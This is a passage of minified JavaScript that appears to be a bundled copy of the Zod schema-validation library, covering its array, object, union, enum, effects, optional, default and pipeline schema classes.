            const n = this._getOrReturnCtx(t);
            return z(n, {
                code: j.invalid_type,
                expected: V.never,
                received: n.parsedType
            }), te
        }
    }
    Ar.create = e => new Ar({
        typeName: ee.ZodNever,
        ...ae(e)
    });
    class Fu extends le {
        _parse(t) {
            if (this._getType(t) !== V.undefined) {
                const r = this._getOrReturnCtx(t);
                return z(r, {
                    code: j.invalid_type,
                    expected: V.void,
                    received: r.parsedType
                }), te
            }
            return kt(t.data)
        }
    }
    Fu.create = e => new Fu({
        typeName: ee.ZodVoid,
        ...ae(e)
    });
    class kn extends le {
        _parse(t) {
            const {
                ctx: n,
                status: r
            } = this._processInputParams(t), i = this._def;
            if (n.parsedType !== V.array) return z(n, {
                code: j.invalid_type,
                expected: V.array,
                received: n.parsedType
            }), te;
            if (i.exactLength !== null) {
                const s = n.data.length > i.exactLength.value,
                    a = n.data.length < i.exactLength.value;
                (s || a) && (z(n, {
                    code: s ? j.too_big : j.too_small,
                    minimum: a ? i.exactLength.value : void 0,
                    maximum: s ? i.exactLength.value : void 0,
                    type: "array",
                    inclusive: !0,
                    exact: !0,
                    message: i.exactLength.message
                }), r.dirty())
            }
            if (i.minLength !== null && n.data.length < i.minLength.value && (z(n, {
                    code: j.too_small,
                    minimum: i.minLength.value,
                    type: "array",
                    inclusive: !0,
                    exact: !1,
                    message: i.minLength.message
                }), r.dirty()), i.maxLength !== null && n.data.length > i.maxLength.value && (z(n, {
                    code: j.too_big,
                    maximum: i.maxLength.value,
                    type: "array",
                    inclusive: !0,
                    exact: !1,
                    message: i.maxLength.message
                }), r.dirty()), n.common.async) return Promise.all([...n.data].map((s, a) => i.type._parseAsync(new Qn(n, s, n.path, a)))).then(s => mt.mergeArray(r, s));
            const o = [...n.data].map((s, a) => i.type._parseSync(new Qn(n, s, n.path, a)));
            return mt.mergeArray(r, o)
        }
        get element() {
            return this._def.type
        }
        min(t, n) {
            return new kn({ ...this._def,
                minLength: {
                    value: t,
                    message: K.toString(n)
                }
            })
        }
        max(t, n) {
            return new kn({ ...this._def,
                maxLength: {
                    value: t,
                    message: K.toString(n)
                }
            })
        }
        length(t, n) {
            return new kn({ ...this._def,
                exactLength: {
                    value: t,
                    message: K.toString(n)
                }
            })
        }
        nonempty(t) {
            return this.min(1, t)
        }
    }
    kn.create = (e, t) => new kn({
        type: e,
        minLength: null,
        maxLength: null,
        exactLength: null,
        typeName: ee.ZodArray,
        ...ae(t)
    });

    function Io(e) {
        if (e instanceof Me) {
            const t = {};
            for (const n in e.shape) {
                const r = e.shape[n];
                t[n] = Wn.create(Io(r))
            }
            return new Me({ ...e._def,
                shape: () => t
            })
        } else return e instanceof kn ? new kn({ ...e._def,
            type: Io(e.element)
        }) : e instanceof Wn ? Wn.create(Io(e.unwrap())) : e instanceof ui ? ui.create(Io(e.unwrap())) : e instanceof Kn ? Kn.create(e.items.map(t => Io(t))) : e
    }
    class Me extends le {
        constructor() {
            super(...arguments), this._cached = null, this.nonstrict = this.passthrough, this.augment = this.extend
        }
        _getCached() {
            if (this._cached !== null) return this._cached;
            const t = this._def.shape(),
                n = pe.objectKeys(t);
            return this._cached = {
                shape: t,
                keys: n
            }
        }
        _parse(t) {
            if (this._getType(t) !== V.object) {
                const u = this._getOrReturnCtx(t);
                return z(u, {
                    code: j.invalid_type,
                    expected: V.object,
                    received: u.parsedType
                }), te
            }
            const {
                status: r,
                ctx: i
            } = this._processInputParams(t), {
                shape: o,
                keys: s
            } = this._getCached(), a = [];
            if (!(this._def.catchall instanceof Ar && this._def.unknownKeys === "strip"))
                for (const u in i.data) s.includes(u) || a.push(u);
            const l = [];
            for (const u of s) {
                const c = o[u],
                    d = i.data[u];
                l.push({
                    key: {
                        status: "valid",
                        value: u
                    },
                    value: c._parse(new Qn(i, d, i.path, u)),
                    alwaysSet: u in i.data
                })
            }
            if (this._def.catchall instanceof Ar) {
                const u = this._def.unknownKeys;
                if (u === "passthrough")
                    for (const c of a) l.push({
                        key: {
                            status: "valid",
                            value: c
                        },
                        value: {
                            status: "valid",
                            value: i.data[c]
                        }
                    });
                else if (u === "strict") a.length > 0 && (z(i, {
                    code: j.unrecognized_keys,
                    keys: a
                }), r.dirty());
                else if (u !== "strip") throw new Error("Internal ZodObject error: invalid unknownKeys value.")
            } else {
                const u = this._def.catchall;
                for (const c of a) {
                    const d = i.data[c];
                    l.push({
                        key: {
                            status: "valid",
                            value: c
                        },
                        value: u._parse(new Qn(i, d, i.path, c)),
                        alwaysSet: c in i.data
                    })
                }
            }
            return i.common.async ? Promise.resolve().then(async () => {
                const u = [];
                for (const c of l) {
                    const d = await c.key,
                        f = await c.value;
                    u.push({
                        key: d,
                        value: f,
                        alwaysSet: c.alwaysSet
                    })
                }
                return u
            }).then(u => mt.mergeObjectSync(r, u)) : mt.mergeObjectSync(r, l)
        }
        get shape() {
            return this._def.shape()
        }
        strict(t) {
            return K.errToObj, new Me({ ...this._def,
                unknownKeys: "strict",
                ...t !== void 0 ? {
                    errorMap: (n, r) => {
                        var i, o, s, a;
                        const l = (s = (o = (i = this._def).errorMap) === null || o === void 0 ? void 0 : o.call(i, n, r).message) !== null && s !== void 0 ? s : r.defaultError;
                        return n.code === "unrecognized_keys" ? {
                            message: (a = K.errToObj(t).message) !== null && a !== void 0 ? a : l
                        } : {
                            message: l
                        }
                    }
                } : {}
            })
        }
        strip() {
            return new Me({ ...this._def,
                unknownKeys: "strip"
            })
        }
        passthrough() {
            return new Me({ ...this._def,
                unknownKeys: "passthrough"
            })
        }
        extend(t) {
            return new Me({ ...this._def,
                shape: () => ({ ...this._def.shape(),
                    ...t
                })
            })
        }
        merge(t) {
            return new Me({
                unknownKeys: t._def.unknownKeys,
                catchall: t._def.catchall,
                shape: () => ({ ...this._def.shape(),
                    ...t._def.shape()
                }),
                typeName: ee.ZodObject
            })
        }
        setKey(t, n) {
            return this.augment({
                [t]: n
            })
        }
        catchall(t) {
            return new Me({ ...this._def,
                catchall: t
            })
        }
        pick(t) {
            const n = {};
            return pe.objectKeys(t).forEach(r => {
                t[r] && this.shape[r] && (n[r] = this.shape[r])
            }), new Me({ ...this._def,
                shape: () => n
            })
        }
        omit(t) {
            const n = {};
            return pe.objectKeys(this.shape).forEach(r => {
                t[r] || (n[r] = this.shape[r])
            }), new Me({ ...this._def,
                shape: () => n
            })
        }
        deepPartial() {
            return Io(this)
        }
        partial(t) {
            const n = {};
            return pe.objectKeys(this.shape).forEach(r => {
                const i = this.shape[r];
                t && !t[r] ? n[r] = i : n[r] = i.optional()
            }), new Me({ ...this._def,
                shape: () => n
            })
        }
        required(t) {
            const n = {};
            return pe.objectKeys(this.shape).forEach(r => {
                if (t && !t[r]) n[r] = this.shape[r];
                else {
                    let o = this.shape[r];
                    for (; o instanceof Wn;) o = o._def.innerType;
                    n[r] = o
                }
            }), new Me({ ...this._def,
                shape: () => n
            })
        }
        keyof() {
            return lE(pe.objectKeys(this.shape))
        }
    }
    Me.create = (e, t) => new Me({
        shape: () => e,
        unknownKeys: "strip",
        catchall: Ar.create(),
        typeName: ee.ZodObject,
        ...ae(t)
    });
    Me.strictCreate = (e, t) => new Me({
        shape: () => e,
        unknownKeys: "strict",
        catchall: Ar.create(),
        typeName: ee.ZodObject,
        ...ae(t)
    });
    Me.lazycreate = (e, t) => new Me({
        shape: e,
        unknownKeys: "strip",
        catchall: Ar.create(),
        typeName: ee.ZodObject,
        ...ae(t)
    });
    class sl extends le {
        _parse(t) {
            const {
                ctx: n
            } = this._processInputParams(t), r = this._def.options;

            function i(o) {
                for (const a of o)
                    if (a.result.status === "valid") return a.result;
                for (const a of o)
                    if (a.result.status === "dirty") return n.common.issues.push(...a.ctx.common.issues), a.result;
                const s = o.map(a => new Qt(a.ctx.common.issues));
                return z(n, {
                    code: j.invalid_union,
                    unionErrors: s
                }), te
            }
            if (n.common.async) return Promise.all(r.map(async o => {
                const s = { ...n,
                    common: { ...n.common,
                        issues: []
                    },
                    parent: null
                };
                return {
                    result: await o._parseAsync({
                        data: n.data,
                        path: n.path,
                        parent: s
                    }),
                    ctx: s
                }
            })).then(i); {
                let o;
                const s = [];
                for (const l of r) {
                    const u = { ...n,
                            common: { ...n.common,
                                issues: []
                            },
                            parent: null
                        },
                        c = l._parseSync({
                            data: n.data,
                            path: n.path,
                            parent: u
                        });
                    if (c.status === "valid") return c;
                    c.status === "dirty" && !o && (o = {
                        result: c,
                        ctx: u
                    }), u.common.issues.length && s.push(u.common.issues)
                }
                if (o) return n.common.issues.push(...o.ctx.common.issues), o.result;
                const a = s.map(l => new Qt(l));
                return z(n, {
                    code: j.invalid_union,
                    unionErrors: a
                }), te
            }
        }
        get options() {
            return this._def.options
        }
    }
    sl.create = (e, t) => new sl({
        options: e,
        typeName: ee.ZodUnion,
        ...ae(t)
    });
    const or = e => e instanceof cl ? or(e.schema) : e instanceof Cn ? or(e.innerType()) : e instanceof ul ? [e.value] : e instanceof ci ? e.options : e instanceof dl ? pe.objectValues(e.enum) : e instanceof fl ? or(e._def.innerType) : e instanceof il ? [void 0] : e instanceof ol ? [null] : e instanceof Wn ? [void 0, ...or(e.unwrap())] : e instanceof ui ? [null, ...or(e.unwrap())] : e instanceof T0 || e instanceof pl ? or(e.unwrap()) : e instanceof hl ? or(e._def.innerType) : [];
    class zd extends le {
        _parse(t) {
            const {
                ctx: n
            } = this._processInputParams(t);
            if (n.parsedType !== V.object) return z(n, {
                code: j.invalid_type,
                expected: V.object,
                received: n.parsedType
            }), te;
            const r = this.discriminator,
                i = n.data[r],
                o = this.optionsMap.get(i);
            return o ? n.common.async ? o._parseAsync({
                data: n.data,
                path: n.path,
                parent: n
            }) : o._parseSync({
                data: n.data,
                path: n.path,
                parent: n
            }) : (z(n, {
                code: j.invalid_union_discriminator,
                options: Array.from(this.optionsMap.keys()),
                path: [r]
            }), te)
        }
        get discriminator() {
            return this._def.discriminator
        }
        get options() {
            return this._def.options
        }
        get optionsMap() {
            return this._def.optionsMap
        }
        static create(t, n, r) {
            const i = new Map;
            for (const o of n) {
                const s = or(o.shape[t]);
                if (!s.length) throw new Error(`A discriminator value for key \`${t}\` could not be extracted from all schema options`);
                for (const a of s) {
                    if (i.has(a)) throw new Error(`Discriminator property ${String(t)} has duplicate value ${String(a)}`);
                    i.set(a, o)
                }
            }
            return new zd({
                typeName: ee.ZodDiscriminatedUnion,
                discriminator: t,
                options: n,
                optionsMap: i,
                ...ae(r)
            })
        }
    }

    function Ip(e, t) {
        const n = Hr(e),
            r = Hr(t);
        if (e === t) return {
            valid: !0,
            data: e
        };
        if (n === V.object && r === V.object) {
            const i = pe.objectKeys(t),
                o = pe.objectKeys(e).filter(a => i.indexOf(a) !== -1),
                s = { ...e,
                    ...t
                };
            for (const a of o) {
                const l = Ip(e[a], t[a]);
                if (!l.valid) return {
                    valid: !1
                };
                s[a] = l.data
            }
            return {
                valid: !0,
                data: s
            }
        } else if (n === V.array && r === V.array) {
            if (e.length !== t.length) return {
                valid: !1
            };
            const i = [];
            for (let o = 0; o < e.length; o++) {
                const s = e[o],
                    a = t[o],
                    l = Ip(s, a);
                if (!l.valid) return {
                    valid: !1
                };
                i.push(l.data)
            }
            return {
                valid: !0,
                data: i
            }
        } else return n === V.date && r === V.date && +e == +t ? {
            valid: !0,
            data: e
        } : {
            valid: !1
        }
    }
    class al extends le {
        _parse(t) {
            const {
                status: n,
                ctx: r
            } = this._processInputParams(t), i = (o, s) => {
                if (kp(o) || kp(s)) return te;
                const a = Ip(o.value, s.value);
                return a.valid ? ((Tp(o) || Tp(s)) && n.dirty(), {
                    status: n.value,
                    value: a.data
                }) : (z(r, {
                    code: j.invalid_intersection_types
                }), te)
            };
            return r.common.async ? Promise.all([this._def.left._parseAsync({
                data: r.data,
                path: r.path,
                parent: r
            }), this._def.right._parseAsync({
                data: r.data,
                path: r.path,
                parent: r
            })]).then(([o, s]) => i(o, s)) : i(this._def.left._parseSync({
                data: r.data,
                path: r.path,
                parent: r
            }), this._def.right._parseSync({
                data: r.data,
                path: r.path,
                parent: r
            }))
        }
    }
    al.create = (e, t, n) => new al({
        left: e,
        right: t,
        typeName: ee.ZodIntersection,
        ...ae(n)
    });
    class Kn extends le {
        _parse(t) {
            const {
                status: n,
                ctx: r
            } = this._processInputParams(t);
            if (r.parsedType !== V.array) return z(r, {
                code: j.invalid_type,
                expected: V.array,
                received: r.parsedType
            }), te;
            if (r.data.length < this._def.items.length) return z(r, {
                code: j.too_small,
                minimum: this._def.items.length,
                inclusive: !0,
                exact: !1,
                type: "array"
            }), te;
            !this._def.rest && r.data.length > this._def.items.length && (z(r, {
                code: j.too_big,
                maximum: this._def.items.length,
                inclusive: !0,
                exact: !1,
                type: "array"
            }), n.dirty());
            const o = [...r.data].map((s, a) => {
                const l = this._def.items[a] || this._def.rest;
                return l ? l._parse(new Qn(r, s, r.path, a)) : null
            }).filter(s => !!s);
            return r.common.async ? Promise.all(o).then(s => mt.mergeArray(n, s)) : mt.mergeArray(n, o)
        }
        get items() {
            return this._def.items
        }
        rest(t) {
            return new Kn({ ...this._def,
                rest: t
            })
        }
    }
    Kn.create = (e, t) => {
        if (!Array.isArray(e)) throw new Error("You must pass an array of schemas to z.tuple([ ... ])");
        return new Kn({
            items: e,
            typeName: ee.ZodTuple,
            rest: null,
            ...ae(t)
        })
    };
    class ll extends le {
        get keySchema() {
            return this._def.keyType
        }
        get valueSchema() {
            return this._def.valueType
        }
        _parse(t) {
            const {
                status: n,
                ctx: r
            } = this._processInputParams(t);
            if (r.parsedType !== V.object) return z(r, {
                code: j.invalid_type,
                expected: V.object,
                received: r.parsedType
            }), te;
            const i = [],
                o = this._def.keyType,
                s = this._def.valueType;
            for (const a in r.data) i.push({
                key: o._parse(new Qn(r, a, r.path, a)),
                value: s._parse(new Qn(r, r.data[a], r.path, a)),
                alwaysSet: a in r.data
            });
            return r.common.async ? mt.mergeObjectAsync(n, i) : mt.mergeObjectSync(n, i)
        }
        get element() {
            return this._def.valueType
        }
        static create(t, n, r) {
            return n instanceof le ? new ll({
                keyType: t,
                valueType: n,
                typeName: ee.ZodRecord,
                ...ae(r)
            }) : new ll({
                keyType: En.create(),
                valueType: t,
                typeName: ee.ZodRecord,
                ...ae(n)
            })
        }
    }
    class Du extends le {
        get keySchema() {
            return this._def.keyType
        }
        get valueSchema() {
            return this._def.valueType
        }
        _parse(t) {
            const {
                status: n,
                ctx: r
            } = this._processInputParams(t);
            if (r.parsedType !== V.map) return z(r, {
                code: j.invalid_type,
                expected: V.map,
                received: r.parsedType
            }), te;
            const i = this._def.keyType,
                o = this._def.valueType,
                s = [...r.data.entries()].map(([a, l], u) => ({
                    key: i._parse(new Qn(r, a, r.path, [u, "key"])),
                    value: o._parse(new Qn(r, l, r.path, [u, "value"]))
                }));
            if (r.common.async) {
                const a = new Map;
                return Promise.resolve().then(async () => {
                    for (const l of s) {
                        const u = await l.key,
                            c = await l.value;
                        if (u.status === "aborted" || c.status === "aborted") return te;
                        (u.status === "dirty" || c.status === "dirty") && n.dirty(), a.set(u.value, c.value)
                    }
                    return {
                        status: n.value,
                        value: a
                    }
                })
            } else {
                const a = new Map;
                for (const l of s) {
                    const u = l.key,
                        c = l.value;
                    if (u.status === "aborted" || c.status === "aborted") return te;
                    (u.status === "dirty" || c.status === "dirty") && n.dirty(), a.set(u.value, c.value)
                }
                return {
                    status: n.value,
                    value: a
                }
            }
        }
    }
    Du.create = (e, t, n) => new Du({
        valueType: t,
        keyType: e,
        typeName: ee.ZodMap,
        ...ae(n)
    });
    class ao extends le {
        _parse(t) {
            const {
                status: n,
                ctx: r
            } = this._processInputParams(t);
            if (r.parsedType !== V.set) return z(r, {
                code: j.invalid_type,
                expected: V.set,
                received: r.parsedType
            }), te;
            const i = this._def;
            i.minSize !== null && r.data.size < i.minSize.value && (z(r, {
                code: j.too_small,
                minimum: i.minSize.value,
                type: "set",
                inclusive: !0,
                exact: !1,
                message: i.minSize.message
            }), n.dirty()), i.maxSize !== null && r.data.size > i.maxSize.value && (z(r, {
                code: j.too_big,
                maximum: i.maxSize.value,
                type: "set",
                inclusive: !0,
                exact: !1,
                message: i.maxSize.message
            }), n.dirty());
            const o = this._def.valueType;

            function s(l) {
                const u = new Set;
                for (const c of l) {
                    if (c.status === "aborted") return te;
                    c.status === "dirty" && n.dirty(), u.add(c.value)
                }
                return {
                    status: n.value,
                    value: u
                }
            }
            const a = [...r.data.values()].map((l, u) => o._parse(new Qn(r, l, r.path, u)));
            return r.common.async ? Promise.all(a).then(l => s(l)) : s(a)
        }
        min(t, n) {
            return new ao({ ...this._def,
                minSize: {
                    value: t,
                    message: K.toString(n)
                }
            })
        }
        max(t, n) {
            return new ao({ ...this._def,
                maxSize: {
                    value: t,
                    message: K.toString(n)
                }
            })
        }
        size(t, n) {
            return this.min(t, n).max(t, n)
        }
        nonempty(t) {
            return this.min(1, t)
        }
    }
    ao.create = (e, t) => new ao({
        valueType: e,
        minSize: null,
        maxSize: null,
        typeName: ee.ZodSet,
        ...ae(t)
    });
    class ts extends le {
        constructor() {
            super(...arguments), this.validate = this.implement
        }
        _parse(t) {
            const {
                ctx: n
            } = this._processInputParams(t);
            if (n.parsedType !== V.function) return z(n, {
                code: j.invalid_type,
                expected: V.function,
                received: n.parsedType
            }), te;

            function r(a, l) {
                return Mu({
                    data: a,
                    path: n.path,
                    errorMaps: [n.common.contextualErrorMap, n.schemaErrorMap, Bu(), ms].filter(u => !!u),
                    issueData: {
                        code: j.invalid_arguments,
                        argumentsError: l
                    }
                })
            }

            function i(a, l) {
                return Mu({
                    data: a,
                    path: n.path,
                    errorMaps: [n.common.contextualErrorMap, n.schemaErrorMap, Bu(), ms].filter(u => !!u),
                    issueData: {
                        code: j.invalid_return_type,
                        returnTypeError: l
                    }
                })
            }
            const o = {
                    errorMap: n.common.contextualErrorMap
                },
                s = n.data;
            if (this._def.returns instanceof vs) {
                const a = this;
                return kt(async function(...l) {
                    const u = new Qt([]),
                        c = await a._def.args.parseAsync(l, o).catch(h => {
                            throw u.addIssue(r(l, h)), u
                        }),
                        d = await Reflect.apply(s, this, c);
                    return await a._def.returns._def.type.parseAsync(d, o).catch(h => {
                        throw u.addIssue(i(d, h)), u
                    })
                })
            } else {
                const a = this;
                return kt(function(...l) {
                    const u = a._def.args.safeParse(l, o);
                    if (!u.success) throw new Qt([r(l, u.error)]);
                    const c = Reflect.apply(s, this, u.data),
                        d = a._def.returns.safeParse(c, o);
                    if (!d.success) throw new Qt([i(c, d.error)]);
                    return d.data
                })
            }
        }
        parameters() {
            return this._def.args
        }
        returnType() {
            return this._def.returns
        }
        args(...t) {
            return new ts({ ...this._def,
                args: Kn.create(t).rest(Vi.create())
            })
        }
        returns(t) {
            return new ts({ ...this._def,
                returns: t
            })
        }
        implement(t) {
            return this.parse(t)
        }
        strictImplement(t) {
            return this.parse(t)
        }
        static create(t, n, r) {
            return new ts({
                args: t || Kn.create([]).rest(Vi.create()),
                returns: n || Vi.create(),
                typeName: ee.ZodFunction,
                ...ae(r)
            })
        }
    }
    class cl extends le {
        get schema() {
            return this._def.getter()
        }
        _parse(t) {
            const {
                ctx: n
            } = this._processInputParams(t);
            return this._def.getter()._parse({
                data: n.data,
                path: n.path,
                parent: n
            })
        }
    }
    cl.create = (e, t) => new cl({
        getter: e,
        typeName: ee.ZodLazy,
        ...ae(t)
    });
    class ul extends le {
        _parse(t) {
            if (t.data !== this._def.value) {
                const n = this._getOrReturnCtx(t);
                return z(n, {
                    received: n.data,
                    code: j.invalid_literal,
                    expected: this._def.value
                }), te
            }
            return {
                status: "valid",
                value: t.data
            }
        }
        get value() {
            return this._def.value
        }
    }
    ul.create = (e, t) => new ul({
        value: e,
        typeName: ee.ZodLiteral,
        ...ae(t)
    });

    function lE(e, t) {
        return new ci({
            values: e,
            typeName: ee.ZodEnum,
            ...ae(t)
        })
    }
    class ci extends le {
        constructor() {
            super(...arguments), fa.set(this, void 0)
        }
        _parse(t) {
            if (typeof t.data != "string") {
                const n = this._getOrReturnCtx(t),
                    r = this._def.values;
                return z(n, {
                    expected: pe.joinValues(r),
                    received: n.parsedType,
                    code: j.invalid_type
                }), te
            }
            if (Ou(this, fa) || iE(this, fa, new Set(this._def.values)), !Ou(this, fa).has(t.data)) {
                const n = this._getOrReturnCtx(t),
                    r = this._def.values;
                return z(n, {
                    received: n.data,
                    code: j.invalid_enum_value,
                    options: r
                }), te
            }
            return kt(t.data)
        }
        get options() {
            return this._def.values
        }
        get enum() {
            const t = {};
            for (const n of this._def.values) t[n] = n;
            return t
        }
        get Values() {
            const t = {};
            for (const n of this._def.values) t[n] = n;
            return t
        }
        get Enum() {
            const t = {};
            for (const n of this._def.values) t[n] = n;
            return t
        }
        extract(t, n = this._def) {
            return ci.create(t, { ...this._def,
                ...n
            })
        }
        exclude(t, n = this._def) {
            return ci.create(this.options.filter(r => !t.includes(r)), { ...this._def,
                ...n
            })
        }
    }
    fa = new WeakMap;
    ci.create = lE;
    class dl extends le {
        constructor() {
            super(...arguments), ha.set(this, void 0)
        }
        _parse(t) {
            const n = pe.getValidEnumValues(this._def.values),
                r = this._getOrReturnCtx(t);
            if (r.parsedType !== V.string && r.parsedType !== V.number) {
                const i = pe.objectValues(n);
                return z(r, {
                    expected: pe.joinValues(i),
                    received: r.parsedType,
                    code: j.invalid_type
                }), te
            }
            if (Ou(this, ha) || iE(this, ha, new Set(pe.getValidEnumValues(this._def.values))), !Ou(this, ha).has(t.data)) {
                const i = pe.objectValues(n);
                return z(r, {
                    received: r.data,
                    code: j.invalid_enum_value,
                    options: i
                }), te
            }
            return kt(t.data)
        }
        get enum() {
            return this._def.values
        }
    }
    ha = new WeakMap;
    dl.create = (e, t) => new dl({
        values: e,
        typeName: ee.ZodNativeEnum,
        ...ae(t)
    });
    class vs extends le {
        unwrap() {
            return this._def.type
        }
        _parse(t) {
            const {
                ctx: n
            } = this._processInputParams(t);
            if (n.parsedType !== V.promise && n.common.async === !1) return z(n, {
                code: j.invalid_type,
                expected: V.promise,
                received: n.parsedType
            }), te;
            const r = n.parsedType === V.promise ? n.data : Promise.resolve(n.data);
            return kt(r.then(i => this._def.type.parseAsync(i, {
                path: n.path,
                errorMap: n.common.contextualErrorMap
            })))
        }
    }
    vs.create = (e, t) => new vs({
        type: e,
        typeName: ee.ZodPromise,
        ...ae(t)
    });
    class Cn extends le {
        innerType() {
            return this._def.schema
        }
        sourceType() {
            return this._def.schema._def.typeName === ee.ZodEffects ? this._def.schema.sourceType() : this._def.schema
        }
        _parse(t) {
            const {
                status: n,
                ctx: r
            } = this._processInputParams(t), i = this._def.effect || null, o = {
                addIssue: s => {
                    z(r, s), s.fatal ? n.abort() : n.dirty()
                },
                get path() {
                    return r.path
                }
            };
            if (o.addIssue = o.addIssue.bind(o), i.type === "preprocess") {
                const s = i.transform(r.data, o);
                if (r.common.async) return Promise.resolve(s).then(async a => {
                    if (n.value === "aborted") return te;
                    const l = await this._def.schema._parseAsync({
                        data: a,
                        path: r.path,
                        parent: r
                    });
                    return l.status === "aborted" ? te : l.status === "dirty" || n.value === "dirty" ? Go(l.value) : l
                }); {
                    if (n.value === "aborted") return te;
                    const a = this._def.schema._parseSync({
                        data: s,
                        path: r.path,
                        parent: r
                    });
                    return a.status === "aborted" ? te : a.status === "dirty" || n.value === "dirty" ? Go(a.value) : a
                }
            }
            if (i.type === "refinement") {
                const s = a => {
                    const l = i.refinement(a, o);
                    if (r.common.async) return Promise.resolve(l);
                    if (l instanceof Promise) throw new Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");
                    return a
                };
                if (r.common.async === !1) {
                    const a = this._def.schema._parseSync({
                        data: r.data,
                        path: r.path,
                        parent: r
                    });
                    return a.status === "aborted" ? te : (a.status === "dirty" && n.dirty(), s(a.value), {
                        status: n.value,
                        value: a.value
                    })
                } else return this._def.schema._parseAsync({
                    data: r.data,
                    path: r.path,
                    parent: r
                }).then(a => a.status === "aborted" ? te : (a.status === "dirty" && n.dirty(), s(a.value).then(() => ({
                    status: n.value,
                    value: a.value
                }))))
            }
            if (i.type === "transform")
                if (r.common.async === !1) {
                    const s = this._def.schema._parseSync({
                        data: r.data,
                        path: r.path,
                        parent: r
                    });
                    if (!tl(s)) return s;
                    const a = i.transform(s.value, o);
                    if (a instanceof Promise) throw new Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");
                    return {
                        status: n.value,
                        value: a
                    }
                } else return this._def.schema._parseAsync({
                    data: r.data,
                    path: r.path,
                    parent: r
                }).then(s => tl(s) ? Promise.resolve(i.transform(s.value, o)).then(a => ({
                    status: n.value,
                    value: a
                })) : s);
            pe.assertNever(i)
        }
    }
    Cn.create = (e, t, n) => new Cn({
        schema: e,
        typeName: ee.ZodEffects,
        effect: t,
        ...ae(n)
    });
    Cn.createWithPreprocess = (e, t, n) => new Cn({
        schema: t,
        effect: {
            type: "preprocess",
            transform: e
        },
        typeName: ee.ZodEffects,
        ...ae(n)
    });
    class Wn extends le {
        _parse(t) {
            return this._getType(t) === V.undefined ? kt(void 0) : this._def.innerType._parse(t)
        }
        unwrap() {
            return this._def.innerType
        }
    }
    Wn.create = (e, t) => new Wn({
        innerType: e,
        typeName: ee.ZodOptional,
        ...ae(t)
    });
    class ui extends le {
        _parse(t) {
            return this._getType(t) === V.null ? kt(null) : this._def.innerType._parse(t)
        }
        unwrap() {
            return this._def.innerType
        }
    }
    ui.create = (e, t) => new ui({
        innerType: e,
        typeName: ee.ZodNullable,
        ...ae(t)
    });
    class fl extends le {
        _parse(t) {
            const {
                ctx: n
            } = this._processInputParams(t);
            let r = n.data;
            return n.parsedType === V.undefined && (r = this._def.defaultValue()), this._def.innerType._parse({
                data: r,
                path: n.path,
                parent: n
            })
        }
        removeDefault() {
            return this._def.innerType
        }
    }
    fl.create = (e, t) => new fl({
        innerType: e,
        typeName: ee.ZodDefault,
        defaultValue: typeof t.default == "function" ? t.default : () => t.default,
        ...ae(t)
    });
    class hl extends le {
        _parse(t) {
            const {
                ctx: n
            } = this._processInputParams(t), r = { ...n,
                common: { ...n.common,
                    issues: []
                }
            }, i = this._def.innerType._parse({
                data: r.data,
                path: r.path,
                parent: { ...r
                }
            });
            return nl(i) ? i.then(o => ({
                status: "valid",
                value: o.status === "valid" ? o.value : this._def.catchValue({
                    get error() {
                        return new Qt(r.common.issues)
                    },
                    input: r.data
                })
            })) : {
                status: "valid",
                value: i.status === "valid" ? i.value : this._def.catchValue({
                    get error() {
                        return new Qt(r.common.issues)
                    },
                    input: r.data
                })
            }
        }
        removeCatch() {
            return this._def.innerType
        }
    }
    hl.create = (e, t) => new hl({
        innerType: e,
        typeName: ee.ZodCatch,
        catchValue: typeof t.catch == "function" ? t.catch : () => t.catch,
        ...ae(t)
    });
    class ju extends le {
        _parse(t) {
            if (this._getType(t) !== V.nan) {
                const r = this._getOrReturnCtx(t);
                return z(r, {
                    code: j.invalid_type,
                    expected: V.nan,
                    received: r.parsedType
                }), te
            }
            return {
                status: "valid",
                value: t.data
            }
        }
    }
    ju.create = e => new ju({
        typeName: ee.ZodNaN,
        ...ae(e)
    });
    const mR = Symbol("zod_brand");
    class T0 extends le {
        _parse(t) {
            const {
                ctx: n
            } = this._processInputParams(t), r = n.data;
            return this._def.type._parse({
                data: r,
                path: n.path,
                parent: n
            })
        }
        unwrap() {
            return this._def.type
        }
    }
    class Ul extends le {
        _parse(t) {
            const {
                status: n,
                ctx: r
            } = this._processInputParams(t);
            if (r.common.async) return (async () => {
                const o = await this._def.in._parseAsync({
                    data: r.data,
                    path: r.path,
                    parent: r
                });
                return o.status === "aborted" ? te : o.status === "dirty" ? (n.dirty(), Go(o.value)) : this._def.out._parseAsync({
                    data: o.value,
                    path: r.path,
                    parent: r
                })
            })(); {
                const i = this._def.in._parseSync({
                    data: r.data,
                    path: r.path,
                    parent: r
                });
                return i.status === "aborted" ? te : i.status === "dirty" ? (n.dirty(), {
                    status: "dirty",
                    value: i.value
                }) : this._def.out._parseSync({
                    data: i.value,
                    path: r.path,
                    parent: r
                })
            }
        }
        static create(t, n) {
            return new Ul({ in: t,
                out: n,
                typeName: ee.ZodPipeline
            })
        }
    }
    class pl extends le {
        _parse(t) {
            const n = this._def.innerType._parse(t),
                r = i => (tl(i) && (i.value = Object.freeze(i.value)), i);
            return nl(n) ? n.then(i => r(i)) : r(n)
        }
        unwrap() {
            return this._def.innerType
        }
    }
    pl.create = (e, t) => new pl({
        innerType: e,
        typeName: ee.ZodReadonly,
        ...ae(t)
    });

    function cE(e, t = {}, n) {
        return e ? gs.create().superRefine((r, i) => {
            var o, s;
            if (!e(r)) {
                const a = typeof t == "function" ? t(r) : typeof t == "string" ? {
                        message: t
                    } : t,
                    l = (s = (o = a.fatal) !== null && o !== void 0 ? o : n) !== null && s !== void 0 ? s : !0,
                    u = typeof a == "string" ? {
                        message: a
                    } : a;
                i.addIssue({
                    code: "custom",
                    ...u,
                    fatal: l
                })
            }
        }) : gs.create()
    }
    const gR = {
        object: Me.lazycreate
    };
    var ee;
    (function(e) {
